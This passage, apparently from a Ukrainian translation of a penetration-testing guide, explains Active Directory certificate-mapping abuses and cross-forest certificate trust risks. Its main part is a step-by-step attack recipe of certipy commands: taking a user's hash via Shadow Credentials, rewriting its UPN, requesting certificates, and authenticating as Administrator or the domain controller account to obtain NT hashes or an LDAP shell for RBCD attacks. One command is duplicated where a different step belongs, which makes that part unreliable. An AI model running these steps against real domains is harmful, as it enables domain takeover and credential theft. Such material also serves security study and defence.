- Налаштування за замовчуванням для `StrongCertificateBindingEnforcement` під `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` - `1`, раніше `0`.

**Сценарій 1**

Коли `StrongCertificateBindingEnforcement` налаштовано як `0`.

**Сценарій 2**

Якщо `CertificateMappingMethods` включає біт `UPN` (`0x4`).

### Використання у випадку 1

З `StrongCertificateBindingEnforcement` налаштованим як `0`, обліковий запис A з дозволами `GenericWrite` може бути використаний для компрометації будь-якого облікового запису B.

Наприклад, маючи дозволи `GenericWrite` на `Jane@corp.local`, зловмисник має на меті компрометувати `Administrator@corp.local`. Процедура відображає ESC9, дозволяючи використовувати будь-який шаблон сертифіката.

Спочатку хеш `Jane` отримується за допомогою Shadow Credentials, використовуючи `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Пізніше `userPrincipalName` `Jane` змінено на `Administrator`, свідомо пропустивши частину `@corp.local`, щоб уникнути порушення обмежень.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Після цього запитується сертифікат, який дозволяє аутентифікацію клієнта як `Jane`, використовуючи типовий шаблон `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` користувача `Jane` потім повертається до свого оригіналу, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Аутентифікація за допомогою отриманого сертифіката виведе NT-хеш `Administrator@corp.local`, що вимагає вказання домену в команді через відсутність деталей домену в сертифікаті.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Випадок зловживання 2

З `CertificateMappingMethods`, що містить прапорець `UPN` (`0x4`), обліковий запис A з дозволами `GenericWrite` може скомпрометувати будь-який обліковий запис B, у якого відсутній атрибут `userPrincipalName`, включаючи облікові записи машин та вбудованого адміністратора домену `Administrator`.

Тут мета - скомпрометувати `DC$@corp.local`, починаючи з отримання хешу `Jane` через Shadow Credentials, використовуючи `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` користувача `Jane` потім встановлено на `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Сертифікат для аутентифікації клієнта запитується як `Jane`, використовуючи типовий шаблон `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` користувача `Jane` повертається до початкового після цього процесу.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Для аутентифікації через Schannel використовується опція `-ldap-shell` Certipy, що підтверджує успішну аутентифікацію як `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Через оболонку LDAP, команди, такі як `set_rbcd`, дозволяють виконувати атаки на обмеження делегування на основі ресурсів (RBCD), що потенційно може підірвати контролер домену.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ця вразливість також поширюється на будь-який обліковий запис користувача, якому не вистачає `userPrincipalName` або де він не відповідає `sAMAccountName`, зі стандартним `Administrator@corp.local` як основною метою через його підвищені привілеї LDAP та відсутність `userPrincipalName` за замовчуванням.


## Компрометація Лісів за Допомогою Сертифікатів Пояснено в Страждальному Способі

### Порушення Довіри до Лісів за Допомогою Компрометованих Центрів Сертифікації

Конфігурація для **перетинного надання сертифікатів** робиться відносно простою. **Сертифікат кореневого ЦС** з ресурсного лісу **публікується в лісах облікових записів** адміністраторами, а **сертифікати підприємства ЦС** з ресурсного лісу **додаються до контейнерів `NTAuthCertificates` та AIA в кожному лісі облікових записів**. Для уточнення, ця угода надає **ЦС в ресурсному лісі повний контроль** над усіма іншими лісами, які він керує управлінням КЗІ. Якщо цей ЦС буде **компрометований зловмисниками**, сертифікати для всіх користувачів як у ресурсному, так і в облікових лісах можуть бути **підроблені ними**, тим самим порушуючи безпековий бар'єр лісу.

### Надання Привілеїв Надання Сертифікатів Іноземним Суб'єктам

У середовищах з кількома лісами обережність потрібна щодо ЦС підприємства, які **публікують шаблони сертифікатів**, які дозволяють **Аутентифікованим Користувачам або іноземним суб'єктам** (користувачам/групам зовнішнім для лісу, до якого належить ЦС підприємства) **права на надання сертифікатів та права на редагування**.\
Під час аутентифікації через довіру, **SID Аутентифікованих Користувачів** додається до токена користувача через AD. Таким чином, якщо домен має ЦС підприємства з шаблоном, який **дозволяє Аутентифікованим Користувачам права на надання сертифікатів**, шаблон може потенційно бути **наданий користувачем з іншого лісу**. Так само, якщо **права на надання сертифікатів явно надані іноземному суб'єкту шаблоном**, тим самим створюється **перетинний відносини контролю доступу**, що дозволяє суб'єкту з одного лісу **надавати сертифікат шаблону з іншого лісу**.

Обидва сценарії призводять до **збільшення поверхні атаки** з одного лісу в інший. Налаштування шаблону сертифіката може бути використано зловмисником для отримання додаткових привілеїв в іншому домені.
